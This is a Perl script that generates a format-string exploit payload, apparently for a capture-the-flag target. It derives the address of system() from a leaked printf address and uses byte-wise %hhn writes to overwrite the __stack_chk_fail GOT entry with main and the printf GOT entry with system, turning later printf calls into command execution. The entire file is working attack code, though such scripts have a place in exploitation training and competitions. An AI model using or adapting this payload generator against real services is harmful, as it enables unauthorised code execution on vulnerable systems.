#!/usr/bin/perl

use strict;
use warnings;

if (@ARGV != 2) {
	warn "Usage: payload_gen.pl printf_address buffer_address\n";
	exit 1;
}

# from libc-database
my $printf_libc = 0x64e40;
my $system_libc = 0x4f420;
# from objdump
my $stack_chk_fail_place = 0x600c50;
my $printf_place = 0x600c20;
my $main_addr = 0x40068a;

# from the server
my $printf_mem = int($ARGV[0]);
my $buffer_addr = int($ARGV[1]);

my $system_mem = $printf_mem + $system_libc - $printf_libc;

my $payload = "";
my $addrs = "";
my $addr_start = 12;
my $outlen = 0;
my $addr_count = 8 + $addr_start;

sub add_write {
	my ($value, $addr) = @_;
	$value &= 0xff;
	if ($value != ($outlen & 0xff)) {
		my $delta = ($value - $outlen) & 0xff;
		$payload .= sprintf("%%%dc",$delta);
		$outlen += $delta;
	}
	$addrs .= pack("Q", $addr);
	$payload .= sprintf("%%%d\$hhn", $addr_count);
	$addr_count++;
}

$addrs .= pack("Q", $stack_chk_fail_place);
$payload .= sprintf("%%%d\$lln", $addr_count);
$addr_count++;

&add_write($main_addr, $stack_chk_fail_place);
&add_write($main_addr >> 8, $stack_chk_fail_place + 1);
&add_write($main_addr >> 16, $stack_chk_fail_place + 2);

&add_write(0xff, $buffer_addr + -0x8 - -0x140);

&add_write($system_mem, $printf_place);
&add_write($system_mem >> 8, $printf_place + 1);
&add_write($system_mem >> 16, $printf_place + 2);

if (length($payload) > 8 * $addr_start) {
	die "too long! $payload\n";
}
$payload .= "x" x (8 * $addr_start - length($payload));
$payload .= $addrs;
$payload .= "\n";

binmode(STDOUT);
print $payload;
